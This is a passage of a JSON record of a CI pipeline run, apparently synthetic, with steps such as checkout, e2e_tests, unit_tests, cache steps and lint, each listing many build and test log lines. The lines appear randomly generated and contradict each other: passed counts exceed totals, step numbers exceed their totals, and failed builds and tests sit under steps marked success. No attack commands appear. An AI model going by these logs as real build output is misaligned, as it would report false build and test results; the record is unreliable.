          "Artifact downloaded: 38MB",
          "Layer 4/13: RUN command",
          "WARNING: webpack has known vulnerabilities",
          "Compiling components/utils.go...",
          "Completed.",
          "[12:18:24] INFO: Cache refreshed",
          "Success!",
          "Layer 2/13: ENV command",
          "Generating source maps...",
          "Generating source maps...",
          "Time: 89.430s",
          "\u2713 All checks passed",
          "[12:18:24] INFO: Cache refreshed",
          "Success!",
          "Step 7/25: Deploying",
          "Success!",
          "Step 9/24: Building",
          "Cache saved successfully",
          "\u2713 lint completed",
          "Image pulled successfully",
          "Layer 9/10: COPY command",
          "Step 12/20: Installing dependencies",
          "Generating source maps...",
          "[12:18:24] DEBUG: Connection pool: 6 active",
          "[12:18:24] WARN: Deprecated API usage",
          "  PASS: unit/test_db_connect.spec.js",
          "pip: Collecting eslint",
          "Optimizing 18 modules...",
          "Artifact uploaded: dist.zip (88MB)",
          "Time: 27.300s",
          "Tests: 477 passed, 153 total",
          "Generating source maps...",
          "Fetching submodules...",
          "Compiling components/service.java...",
          "\u2717 build failed with exit code 87",
          "Fetching submodules...",
          "\u2713 All checks passed",
          "Compiling src/index.js...",
          "Done.",
          "[12:18:24] INFO: Cache refreshed",
          "NODE_ENV=development",
          "Minifying app.js",
          "Success!",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "pip install: Successfully installed jest-3.13",
          "\u2713 All checks passed",
          "[12:18:24] INFO: Request completed",
          "Using Python 3.11",
          "Uploading artifact 'dist' (9 files)",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-11-30T12:18:58.844706",
        "finished_at": "2025-11-30T12:19:03.381425",
        "log_lines": [
          "=== Step: checkout ===",
          "  PASS: test_cache_hit (55ms)",
          "Layer 5/10: ENV command",
          "Finished.",
          "Tests: 397 passed, 209 total",
          "Step 16/17: Testing",
          "Installing jest@1.14.4",
          "Already up to date.",
          "Creating production build...",
          "Coverage: 93% statements, 95% branches",
          "Waiting...",
          "\u2713 All checks passed",
          "[12:18:24] INFO: Cache refreshed",
          "[12:18:24] INFO: Request completed",
          "Creating production build...",
          "Cache hit for key-7000",
          "Loading...",
          "Exception: NullPointerException",
          "Uploading artifact 'dist' (45 files)",
          "Installing react@2.17.1",
          "Bundling styles.css",
          "Completed.",
          "  PASS: test_db_connect (213ms)",
          "Bundling styles.css",
          "Cache miss for key-8949",
          "\u2713 Step 'build' succeeded",
          "[12:18:24] INFO: Connecting to database",
          "Using Python 3.11",
          "POST /api - 201 (81ms)",
          "Fetching submodules...",
          "Creating production build...",
          "Connection established",
          "Platform: darwin-arm64",
          "npm notice: package.json updated",
          "npm install: added 470 packages",
          "[12:18:24] DEBUG: Initializing service",
          "POST /data - 201 (500ms)",
          "[12:18:24] INFO: Request completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Fetching submodules...",
          "Compiling lib/main.py...",
          "Ready.",
          "WARNING: axios has known vulnerabilities",
          "Cache invalidated: build",
          "Creating production build...",
          "[12:18:24] DEBUG: Initializing service",
          "[12:18:24] DEBUG: Memory usage: 1927MB",
          "[12:18:24] DEBUG: Initializing service",
          "Test Suites: 25 passed, 5 total",
          "Using Node.js 18.17.7",
          "Tests: 56 passed, 430 total",
          "pip: Installing build dependencies...",
          "Snapshots: 34 passed, 32 total",
          "Pushing to registry...",
          "GET /health - 201 (44ms)",
          "WARNING: prettier has known vulnerabilities",
          "WARNING: react has known vulnerabilities",
          "Already up to date.",
          "Pulling image: python:latest",
          "  PASS: integration/test_user_create.spec.js",
          "[12:18:24] DEBUG: Initializing service",
          "[12:18:24] INFO: Processing request",
          "Transforming 372 files...",
          "Generating source maps...",
          "Checking out develop branch",
          "Cache miss for key-9526",
          "npm install: resolved 769 packages",
          "Step 10/24: Building",
          "[12:18:24] INFO: Cache refreshed",
          "Layer 8/13: ENV command",
          "Environment: test",
          "pip: Collecting lodash",
          "Compiling utils/service.java...",
          "pip: Collecting eslint",
          "Compiling src/index.js...",
          "Compiling lib/main.py...",
          "[12:18:24] WARN: Deprecated API usage",
          "[12:18:24] WARN: Deprecated API usage",
          "Compiling utils/app.ts...",
          "Layer 9/10: ENV command",
          "POST /upload - 201 (80ms)",
          "Pushing to registry...",
          "Step 3/17: Testing",
          "[12:18:24] WARN: Deprecated API usage",
          "Time: 69.532s",
          "Optimizing 72 modules...",
          "[12:18:24] DEBUG: Query executed in 58ms",
          "Ran 104 tests in 21s",
          "Platform: darwin-arm64",
          "Cache invalidated: dependencies",
          "Ready.",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Coverage: 84% statements, 75% branches",
          "Transforming 947 files...",
          "Compiling utils/app.ts...",
          "Installing axios@3.15.8",
          "Cache saved successfully",
          "Artifact uploaded: build.tar.gz (32MB)",
          "[12:18:24] INFO: Processing request",
          "Coverage: 82% statements, 94% branches",
          "Compiling src/service.java...",
          "Cache miss for key-2275",
          "Step 6/19: Building",
          "Step 3/20: Building",
          "Platform: win32-x64",
          "Artifact downloaded: 12MB",
          "FAILED: test_api_health",
          "Ran 57 tests in 50s",
          "Installing lodash@4.14.7",
          "POST /api - 202 (275ms)",
          "pip: Collecting axios",
          "Creating production build...",
          "\u2713 All checks passed",
          "Completed.",
          "Snapshots: 9 passed, 42 total",
          "Compiling lib/service.java...",
          "Success!",
          "NODE_ENV=test",
          "Step 15/25: Building",
          "[12:18:24] DEBUG: Initializing service",
          "\u2713 package completed",
          "Verifying...",
          "Waiting...",
          "Installing axios@4.20.10",
          "Cache hit for key-9501",
          "Image pulled successfully",
          "pip: Collecting lodash",
          "Connecting to test.io:443...",
          "Building Docker image...",
          "[12:18:24] WARN: Deprecated API usage",
          "Completed.",
          "Already up to date.",
          "pip: Collecting eslint",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 17/18: Installing dependencies",
          "POST /data - 200 (129ms)",
          "Compiling lib/service.java...",
          "[12:18:24] DEBUG: Query executed in 13ms",
          "FAILED: test_api_health",
          "\u2713 Task completed in 2283ms",
          "Coverage: 86% statements, 60% branches",
          "Ran 196 tests in 39s",
          "[12:18:24] INFO: Processing request",
          "[12:18:24] DEBUG: Connection pool: 18 active",
          "Connecting to test.io:443...",
          "Environment: development",
          "\u2713 Step 'setup' succeeded",
          "npm install: resolved 1907 packages",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-11-30T12:19:03.381425",
        "finished_at": "2025-11-30T12:19:14.723223",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "POST /data - 202 (167ms)",
          "[12:18:24] WARN: Deprecated API usage",
          "[12:18:24] DEBUG: Query executed in 86ms",
          "Success!",
          "NODE_ENV=test",
          "Switched to branch 'feature/task-790'",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Ready.",
          "Using Node.js 16.19.7",
          "NODE_ENV=test",
          "Connecting to cloud.services:443...",
          "Connecting to acme.corp:443...",
          "Cache invalidated: dependencies",
          "Done.",
          "Snapshots: 38 passed, 29 total",
          "Uploading artifact 'coverage' (37 files)",
          "Done.",
          "Compiling components/utils.go...",
          "Checking out master branch",
          "npm install: resolved 1351 packages",
          "[12:18:24] INFO: Starting build process",
          "Using Node.js 16.3.4",
          "Processing...",
          "Cache saved successfully",
          "Time: 106.804s",
          "[12:18:24] INFO: Request completed",
          "WARNING: eslint has known vulnerabilities",
          "Exception: NullPointerException",
          "Verifying...",
          "Platform: win32-x64",
          "[12:18:24] INFO: Processing request",
          "Layer 5/11: COPY command",
          "[12:18:24] DEBUG: Initializing service",
          "[12:18:24] DEBUG: Loading configuration",
          "Cache invalidated: build",
          "Compiling utils/service.java...",
          "Tests: 80 passed, 491 total",
          "[12:18:24] ERROR: Connection failed",
          "Waiting...",
          "Ready.",
          "pip: Collecting webpack",
          "Using Python 3.12",
          "WARNING: lodash has known vulnerabilities",
          "\u2713 All checks passed",
          "Pushing to registry...",
          "Image pulled successfully",
          "pip install: Successfully installed express-4.12",
          "Pushing to registry...",
          "Already up to date.",
          "Cache hit for key-8832",
          "Fetching submodules...",
          "[12:18:24] ERROR: Connection failed",
          "pip install: Successfully installed react-5.8",
          "Creating production build...",
          "Uploading artifact 'build' (46 files)",
          "Tests: 466 passed, 463 total",
          "Connection established",
          "Tests: 307 passed, 476 total",
          "Compiling components/service.java...",
          "Success!",
          "WARNING: react has known vulnerabilities",
          "Compiling components/service.java...",
          "Uploading artifact 'coverage' (3 files)",
          "Compiling src/main.py...",
          "Tests: 435 passed, 170 total",
          "[12:18:24] WARN: Deprecated API usage",
          "[12:18:24] DEBUG: Initializing service",
          "[12:18:24] INFO: Request completed",
          "Installing eslint@1.4.3",
          "Processing...",
          "Tests: 137 passed, 165 total",
          "POST /upload - 202 (313ms)",
          "npm install: resolved 1216 packages",
          "Building Docker image...",
          "\u2713 All checks passed",
          "\u2713 Task completed in 193ms",
          "npm install: resolved 1491 packages",
          "OK",
          "pip: Downloading lodash-1.19.tar.gz",
          "Environment: test",
          "Environment: test",
          "pip: Installing build dependencies...",
          "Done.",
          "Platform: win32-x64",
          "Verifying...",
          "POST /api - 201 (455ms)",
          "[12:18:24] INFO: Starting build process",
          "pip: Collecting eslint",
          "Connection established",
          "  PASS: integration/test_db_connect.spec.js",
          "[12:18:24] INFO: Cache refreshed",
          "Creating production build...",
          "[12:18:24] INFO: Processing request",
          "Completed.",
          "  PASS: integration/test_api_health.spec.js",
          "Step 2/18: Running migrations",
          "[12:18:24] INFO: Cache refreshed",
          "WARNING: react has known vulnerabilities",
          "pip: Collecting prettier",
          "Verifying...",
          "TLS handshake completed",
          "Compiling src/index.js...",
          "[12:18:24] INFO: Cache refreshed",
          "Pulling image: python:3.11",
          "OK",
          "Using Python 3.9",
          "WARNING: eslint has known vulnerabilities",
          "Waiting...",
          "Cache invalidated: build",
          "Artifact uploaded: dist.zip (40MB)",
          "pip: Installing build dependencies...",
          "\u2713 validate completed",
          "Step 5/23: Running migrations",
          "[12:18:24] ERROR: Connection failed",
          "Cache restored successfully (60MB)",
          "WARNING: jest has known vulnerabilities",
          "Waiting...",
          "Cache restored successfully (225MB)",
          "\u2713 Task completed in 1728ms",
          "Using Python 3.11",
          "Already up to date.",
          "OK",
          "GET /health - 200 (76ms)",
          "OK",
          "Processing...",
          "Tests: 479 passed, 446 total",
          "[12:18:24] INFO: Request completed",
          "Step 17/20: Deploying",
          "Connection established",
          "Cache restored successfully (26MB)",
          "Fetching submodules...",
          "pip: Collecting jest",
          "npm notice: package.json updated",
          "Step 19/21: Installing dependencies",
          "Checking out develop branch",
          "Compiling components/index.js...",
          "[12:18:24] DEBUG: Memory usage: 1078MB",
          "Coverage: 98% statements, 79% branches",
          "[12:18:24] DEBUG: Loading configuration",
          "Cache restored successfully (35MB)",
          "Cache hit for key-6892",
          "Platform: win32-x64",
          "Snapshots: 47 passed, 42 total",
          "Verifying...",
          "Cache saved successfully",
          "Platform: win32-x64",
          "Finished.",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-11-30T12:19:14.723223",
        "finished_at": "2025-11-30T12:19:48.748617",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Connecting to cloud.services:443...",
          "Coverage: 70% statements, 67% branches",
          "[12:18:24] DEBUG: Memory usage: 1739MB",
          "Image pulled successfully",
          "Test Suites: 14 passed, 27 total",
          "Time: 41.978s",
          "Connection established",
          "  PASS: unit/test_cache_hit.spec.js",
          "Step 17/15: Running migrations",
          "Compiling src/utils.go...",
          "Tests: 134 passed, 498 total",
          "Layer 7/14: COPY command",
          "\u2717 build failed with exit code 37",
          "Processing...",
          "Artifact uploaded: build.tar.gz (1MB)",
          "pip: Collecting lodash",
          "Cache invalidated: node_modules",
          "[12:18:24] DEBUG: Initializing service",
          "Waiting...",
          "Exception: RuntimeError",
          "Image pulled successfully",
          "pip: Installing build dependencies...",
          "HEAD is now at 4937c90",
          "Compiling utils/main.py...",
          "WARNING: eslint has known vulnerabilities",
          "pip install: Successfully installed webpack-3.13",
          "[12:18:24] DEBUG: Query executed in 91ms",
          "Exception: RuntimeError",
          "Generating source maps...",
          "npm notice: package.json updated",
          "[12:18:24] DEBUG: Query executed in 36ms",
          "[12:18:24] DEBUG: Initializing service",
          "[12:18:24] WARN: Deprecated API usage",
          "[12:18:24] DEBUG: Connection pool: 12 active",
          "\u2713 Task completed in 3713ms",
          "Snapshots: 27 passed, 32 total",
          "[12:18:24] DEBUG: Loading configuration",
          "pip: Downloading lodash-1.7.tar.gz",
          "\u2713 All checks passed",
          "Loading...",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Building Docker image...",
          "TLS handshake completed",
          "Platform: win32-x64",
          "Ready.",
          "Success!",
          "Compiling src/main.py...",
          "[12:18:24] DEBUG: Memory usage: 1737MB",
          "[12:18:24] INFO: Connecting to database",
          "[12:18:24] INFO: Connecting to database",
          "Artifact uploaded: dist.zip (9MB)",
          "Cache miss for key-3252",
          "FAILED: test_cache_hit",
          "Step 9/21: Testing",
          "Already up to date.",
          "Coverage: 95% statements, 99% branches",
          "Minifying main.js",
          "npm notice: package.json updated",
          "Coverage: 100% statements, 89% branches",
          "Tests: 86 passed, 172 total",
          "Compiling src/service.java...",
          "Cache restored successfully (355MB)",
          "Step 18/18: Testing",
          "Compiling lib/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Completed.",
          "Completed.",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "TLS handshake completed",
          "npm notice: created a lockfile",
          "Already up to date.",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Environment: development",
          "Step 2/18: Testing",
          "Checking out develop branch",
          "[12:18:24] DEBUG: Loading configuration",
          "Cache restored successfully (149MB)",
          "Generating source maps...",
          "npm notice: package.json updated",
          "[12:18:24] INFO: Starting build process",
          "Transforming 672 files...",
          "Optimizing 75 modules...",
          "WARNING: express has known vulnerabilities",
          "Compiling src/index.js...",
          "Tests: 304 passed, 160 total",
          "Compiling src/app.ts...",
          "WARNING: webpack has known vulnerabilities",
          "pip: Installing build dependencies...",
          "Coverage: 78% statements, 87% branches",
          "Verifying...",
          "Installing eslint@1.10.8",
          "\u2713 Step 'test' succeeded",
          "[12:18:24] INFO: Processing request",
          "Tests: 477 passed, 261 total",
          "GET /health - 204 (22ms)",
          "Ran 74 tests in 54s",
          "Finished.",
          "Tests: 482 passed, 211 total",
          "GET /api - 200 (51ms)",
          "Image pulled successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache saved successfully",
          "Ran 21 tests in 9s",
          "Using Node.js 18.13.5",
          "Bundling vendor.css",
          "Cache hit for key-9778",
          "Installing webpack@1.9.2",
          "HEAD is now at 3071dcf",
          "npm install: resolved 1492 packages",
          "[12:18:24] DEBUG: Query executed in 30ms",
          "Completed.",
          "Completed.",
          "Success!",
          "npm install: resolved 1636 packages",
          "Compiling utils/service.java...",
          "Platform: darwin-arm64",
          "Connection established",
          "Cache miss for key-9245",
          "WARNING: react has known vulnerabilities",
          "Time: 115.500s",
          "Generating source maps...",
          "  PASS: test_cache_hit (485ms)",
          "Compiling src/index.js...",
          "Image pulled successfully",
          "[12:18:24] INFO: Connecting to database",
          "npm notice: package.json updated",
          "Compiling utils/app.ts...",
          "npm notice: package.json updated",
          "pip: Installing build dependencies...",
          "pip: Collecting webpack",
          "Image pulled successfully",
          "Cache restored successfully (318MB)",
          "OK",
          "\u2713 All checks passed",
          "Fetching submodules...",
          "[12:18:24] DEBUG: Memory usage: 762MB",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2717 build failed with exit code 57",
          "[12:18:24] DEBUG: Connection pool: 7 active",
          "Cache hit for key-9811",
          "Already up to date.",
          "Step 10/22: Linting",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Using Python 3.9",
          "Waiting...",
          "Building Docker image...",
          "HEAD is now at 8af865d",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-11-30T12:19:48.748617",
        "finished_at": "2025-11-30T12:19:55.553696",
        "log_lines": [
          "=== Step: restore_cache ===",
          "yarn add: Done in 14.41s",
          "Cache hit for key-1917",
          "Finished.",
          "Platform: win32-x64",
          "[12:18:24] DEBUG: Query executed in 65ms",
          "Using Node.js 17.20.5",
          "Processing...",
          "Artifact uploaded: dist.zip (80MB)",
          "Building Docker image...",
          "\u2713 Step 'build' succeeded",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "npm install: added 288 packages",
          "Bundling runtime.css",
          "Artifact downloaded: 12MB",
          "Pushing to registry...",
          "Transforming 385 files...",
          "  PASS: e2e/test_api_health.spec.js",
          "NODE_ENV=development",
          "Connecting to cloud.services:443...",
          "Ran 196 tests in 9s",
          "npm install: added 349 packages",
          "Step 16/15: Deploying",
          "Test Suites: 28 passed, 5 total",
          "Building Docker image...",
          "Uploading artifact 'dist' (38 files)",
          "Cache saved successfully",
          "Creating production build...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Coverage: 86% statements, 78% branches",
          "Image pulled successfully",
          "Already up to date.",
          "Cache hit for key-3622",
          "Compiling components/utils.go...",
          "Minifying main.js",
          "pip: Collecting eslint",
          "Pushing to registry...",
          "\u2713 Step 'build' succeeded",
          "Loading...",
          "\u2713 package completed",
          "[12:18:24] DEBUG: Loading configuration",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 15/15: Deploying",
          "Platform: linux-x64",
          "GET /status - 200 (52ms)",
          "Bundling styles.js",
          "[12:18:24] INFO: Request completed",
          "[12:18:24] INFO: Starting build process",
          "Connecting to example.com:443...",
          "Optimizing 42 modules...",
          "Connecting to example.com:443...",
          "Compiling utils/app.ts...",
          "Bundling styles.css",
          "[12:18:24] DEBUG: Memory usage: 1101MB",
          "NODE_ENV=test",
          "Verifying...",
          "Step 14/15: Deploying",
          "Pulling image: python:3.11",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Layer 2/8: COPY command",
          "[12:18:24] DEBUG: Loading configuration",
          "Step 4/16: Linting",
          "npm install: resolved 1770 packages",
          "Completed.",
          "pip install: Successfully installed express-3.15",
          "Cache hit for key-5261",
          "\u2713 package completed",
          "Fetching submodules...",
          "POST /data - 202 (301ms)",
          "Step 2/19: Deploying",
          "Snapshots: 18 passed, 39 total",
          "npm notice: created a lockfile",
          "[12:18:24] DEBUG: Loading configuration",
          "Pulling image: node:18",
          "Transforming 164 files...",
          "  PASS: unit/test_cache_hit.spec.js",
          "pip: Installing build dependencies...",
          "\u2713 All checks passed",
          "Cache restored successfully (87MB)",
          "Using Node.js 19.15.2",
          "Building Docker image...",
          "Compiling src/main.py...",
          "npm notice: package.json updated",
          "Step 14/22: Linting",
          "[12:18:24] WARN: Deprecated API usage",
          "Test Suites: 28 passed, 30 total",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Using Python 3.12",
          "Using Node.js 17.8.9",
          "Compiling components/index.js...",
          "[12:18:24] DEBUG: Query executed in 28ms",
          "Step 10/16: Deploying",
          "Image pulled successfully",
          "Cache hit for key-6599",
          "Platform: win32-x64",
          "Pulling image: alpine:latest",
          "NODE_ENV=development",
          "Cache restored successfully (56MB)",
          "Layer 10/10: ENV command",
          "Layer 7/15: ENV command",
          "Cache saved successfully",
          "Cache miss for key-8972",
          "\u2717 build failed with exit code 87",
          "\u2713 Task completed in 4277ms",
          "[12:18:24] ERROR: Connection failed",
          "Ready.",
          "Cache miss for key-5545",
          "[12:18:24] WARN: Deprecated API usage",
          "Generating source maps...",
          "Connecting to test.io:443...",
          "Platform: linux-x64",
          "Compiling lib/handler.rs...",
          "GET /api - 200 (67ms)",
          "Cache restored successfully (384MB)",
          "[12:18:24] DEBUG: Memory usage: 1842MB",
          "Ran 191 tests in 43s",
          "Building Docker image...",
          "[12:18:24] INFO: Request completed",
          "  PASS: test_api_health (186ms)",
          "Already up to date.",
          "[12:18:24] DEBUG: Memory usage: 927MB",
          "Cache restored successfully (380MB)",
          "Generating source maps...",
          "Environment: production",
          "Optimizing 31 modules...",
          "Test Suites: 25 passed, 42 total",
          "WARNING: lodash has known vulnerabilities",
          "[12:18:24] WARN: Deprecated API usage",
          "Verifying...",
          "npm install: resolved 169 packages",
          "Cache saved successfully",
          "Pulling image: node:3.11",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Switched to branch 'feature/task-325'",
          "Fetching submodules...",
          "Bundling main.js",
          "Compiling utils/main.py...",
          "Artifact downloaded: 34MB",
          "NODE_ENV=production",
          "Connection established",
          "Installing prettier@1.19.2",
          "Step 10/23: Installing dependencies",
          "Verifying...",
          "pip install: Successfully installed eslint-1.14",
          "Compiling lib/app.ts...",
          "Using Node.js 17.4.3",
          "Finished.",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-11-30T12:19:55.553696",
        "finished_at": "2025-11-30T12:20:02.358775",
        "log_lines": [
          "=== Step: save_cache ===",
          "Time: 58.227s",
          "[12:18:24] WARN: Deprecated API usage",
          "\u2713 Step 'setup' succeeded",
          "Fetching submodules...",
          "pip: Downloading express-2.12.tar.gz",
          "Cache hit for key-7648",
          "Time: 33.93s",
          "[12:18:24] DEBUG: Query executed in 98ms",
          "TLS handshake completed",
          "Step 10/25: Testing",
          "Using Python 3.11",
          "\u2717 build failed with exit code 62",
          "Step 13/15: Installing dependencies",
          "Optimizing 53 modules...",
          "[12:18:24] INFO: Processing request",
          "HEAD is now at 2b32236",
          "Checking out main branch",
          "Compiling lib/utils.go...",
          "Switched to branch 'hotfix/task-615'",
          "GET /health - 204 (85ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 8/17: Linting",
          "OK",
          "Pushing to registry...",
          "TLS handshake completed",
          "Waiting...",
          "Connecting to acme.corp:443...",
          "Checking out main branch",
          "Finished.",
          "Coverage: 78% statements, 89% branches",
          "Transforming 272 files...",
          "[12:18:24] WARN: Deprecated API usage",
          "[12:18:24] WARN: Deprecated API usage",
          "Checking out master branch",
          "Success!",
          "Platform: darwin-arm64",
          "Done.",
          "Using Node.js 18.16.9",
          "POST /data - 202 (478ms)",
          "Pushing to registry...",
          "Verifying...",
          "Already up to date.",
          "[12:18:24] DEBUG: Connection pool: 17 active",
          "Completed.",
          "pip: Downloading express-1.2.tar.gz",
          "Pushing to registry...",
          "[12:18:24] INFO: Cache refreshed",
          "[12:18:24] WARN: Deprecated API usage",
          "Loading...",
          "  PASS: test_api_health (192ms)",
          "Done.",
          "Step 1/18: Linting",
          "Image pulled successfully",
          "Step 11/19: Testing",
          "Already up to date.",
          "Environment: development",
          "Cache saved successfully",
          "Cache saved successfully",
          "Ready.",
          "Cache restored successfully (177MB)",
          "WARNING: lodash has known vulnerabilities",
          "Bundling styles.js",
          "Environment: development",
          "OK",
          "npm install: added 433 packages",
          "Loading...",
          "Artifact downloaded: 8MB",
          "Test Suites: 48 passed, 36 total",
          "[12:18:24] INFO: Connecting to database",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:18:24] DEBUG: Connection pool: 6 active",
          "Cache restored successfully (288MB)",
          "Using Node.js 18.18.1",
          "[12:18:24] INFO: Cache refreshed",
          "[12:18:24] DEBUG: Query executed in 64ms",
          "Switched to branch 'hotfix/task-943'",
          "Using Python 3.9",
          "TLS handshake completed",
          "Finished.",
          "Step 12/24: Building",
          "Transforming 171 files...",
          "Bundling styles.css",
          "[12:18:24] DEBUG: Initializing service",
          "Ran 91 tests in 32s",
          "Layer 5/9: RUN command",
          "Connection established",
          "Generating source maps...",
          "Compiling lib/service.java...",
          "[12:18:24] INFO: Request completed",
          "Cache hit for key-8107",
          "Cache miss for key-5362",
          "[12:18:24] WARN: Deprecated API usage",
          "pip: Installing build dependencies...",
          "Compiling components/app.ts...",
          "Image pulled successfully",
          "Switched to branch 'hotfix/task-997'",
          "Using Python 3.9",
          "[12:18:24] DEBUG: Memory usage: 1724MB",
          "Tests: 108 passed, 263 total",
          "Building Docker image...",
          "NODE_ENV=development",
          "Image pulled successfully",
          "Success!",
          "Cache saved successfully",
          "npm notice: created a lockfile",
          "Already up to date.",
          "Cache miss for key-7498",
          "Step 19/16: Linting",
          "[12:18:24] DEBUG: Query executed in 83ms",
          "Uploading artifact 'build' (23 files)",
          "WARNING: express has known vulnerabilities",
          "Compiling utils/main.py...",
          "Step 12/25: Building",
          "Step 10/22: Running migrations",
          "Transforming 399 files...",
          "[12:18:24] DEBUG: Memory usage: 1701MB",
          "Step 17/16: Building",
          "Tests: 98 passed, 400 total",
          "Pushing to registry...",
          "  PASS: e2e/test_auth_login.spec.js",
          "FAILED: test_cache_hit",
          "Step 13/24: Running migrations",
          "Compiling lib/handler.rs...",
          "Success!",
          "Ran 179 tests in 50s",
          "[12:18:24] INFO: Processing request",
          "Connecting to cloud.services:443...",
          "Compiling lib/app.ts...",
          "Verifying...",
          "pip: Installing build dependencies...",
          "npm notice: created a lockfile",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: dist.zip (26MB)",
          "Using Node.js 19.19.6",
          "Uploading artifact 'dist' (50 files)",
          "Checking out main branch",
          "pip: Downloading webpack-3.2.tar.gz",
          "[12:18:24] INFO: Processing request",
          "Time: 34.168s",
          "Step 9/21: Building",
          "Building Docker image...",
          "Using Node.js 17.20.10",
          "Layer 6/12: RUN command",
          "Installing axios@3.5.3",
          "Layer 7/11: RUN command",
          "Ready.",
          "Pulling image: alpine:3.11",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-11-30T12:20:02.358775",
        "finished_at": "2025-11-30T12:20:13.700573",
        "log_lines": [
          "=== Step: lint ===",
          "\u2713 Task completed in 833ms",
          "Ran 107 tests in 42s",
          "yarn add: Done in 12.28s",
          "Step 5/22: Building",
          "Installing eslint@2.14.8",
          "Time: 16.276s",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:18:24] ERROR: Connection failed",
          "Waiting...",
          "Minifying app.js",
          "Tests: 320 passed, 136 total",
          "Connecting to cloud.services:443...",
          "[12:18:24] INFO: Request completed",
          "[12:18:24] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 4/22: Installing dependencies",
          "OK",
          "Layer 4/11: COPY command",
          "Artifact uploaded: build.tar.gz (25MB)",
          "FAILED: test_auth_login",
          "Layer 4/11: ENV command",
          "POST /upload - 201 (498ms)",
          "WARNING: eslint has known vulnerabilities",
          "Switched to branch 'bugfix/task-914'",
          "Done.",
          "Ran 189 tests in 45s",
          "Finished.",
          "Waiting...",
          "NODE_ENV=test",
          "Cache saved successfully",
          "\u2717 build failed with exit code 63",
          "Optimizing 27 modules...",
          "Loading...",
          "Snapshots: 48 passed, 9 total",
          "Artifact uploaded: dist.zip (5MB)",
          "pip: Downloading prettier-1.0.tar.gz",
          "Compiling src/app.ts...",
          "Cache saved successfully",
          "Artifact downloaded: 40MB",
          "Bundling vendor.js",
          "OK",
          "Environment: test",
          "Compiling components/handler.rs...",
          "NODE_ENV=test",
          "\u2713 Step 'install' succeeded",
          "Image pulled successfully",
          "Waiting...",
          "Fetching submodules...",
          "[12:18:24] INFO: Connecting to database",
          "Tests: 433 passed, 379 total",
          "[12:18:24] DEBUG: Initializing service",
          "Transforming 787 files...",
          "Loading...",
          "Connection established",
          "Cache saved successfully",
          "Loading...",
          "Fetching submodules...",
          "WARNING: axios has known vulnerabilities",
          "Artifact uploaded: dist.zip (96MB)",
          "yarn add: Done in 6.45s",
          "Using Node.js 17.12.10",
          "Ran 37 tests in 8s",
          "[12:18:24] ERROR: Connection failed",
          "pip: Installing build dependencies...",
          "Using Python 3.10",
          "Cache restored successfully (18MB)",
          "FAILED: test_api_health",
          "Loading...",
          "[12:18:24] DEBUG: Memory usage: 1738MB",
          "  PASS: test_db_connect (292ms)",
          "\u2713 All checks passed",
          "Compiling lib/utils.go...",
          "Connection established",
          "Generating source maps...",
          "Installing webpack@2.13.8",
          "Creating production build...",
          "Step 14/18: Installing dependencies",
          "WARNING: express has known vulnerabilities",
          "Artifact downloaded: 9MB",
          "npm install: added 276 packages",
          "\u2713 Task completed in 3341ms",
          "Installing webpack@4.4.10",
          "OK",
          "Compiling src/app.ts...",
          "Coverage: 94% statements, 81% branches",
          "WARNING: lodash has known vulnerabilities",
          "Step 10/23: Deploying",
          "Bundling runtime.js",
          "Cache hit for key-4782",
          "  PASS: e2e/test_db_connect.spec.js",
          "Bundling runtime.css",
          "Compiling components/app.ts...",
          "Checking out master branch",
          "Image pulled successfully",
          "Layer 3/11: RUN command",
          "Step 16/22: Deploying",
          "[12:18:24] DEBUG: Loading configuration",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Connecting to startup.dev:443...",
          "Ran 173 tests in 8s",
          "Environment: production",
          "Using Python 3.10",
          "Checking out develop branch",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Environment: development",
          "Time: 112.582s",
          "Step 13/25: Testing",
          "Connecting to cloud.services:443...",
          "[12:18:24] WARN: Deprecated API usage",
          "Transforming 923 files...",
          "\u2717 build failed with exit code 16",
          "Step 17/18: Linting",
          "Step 1/17: Running migrations",
          "Connection established",
          "Environment: development",
          "Creating production build...",
          "Already up to date.",
          "[12:18:24] DEBUG: Initializing service",
          "pip: Downloading jest-4.6.tar.gz",
          "Using Python 3.11",
          "Test Suites: 17 passed, 43 total",
          "Pulling image: node:3.11",
          "Creating production build...",
          "Step 19/19: Deploying",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
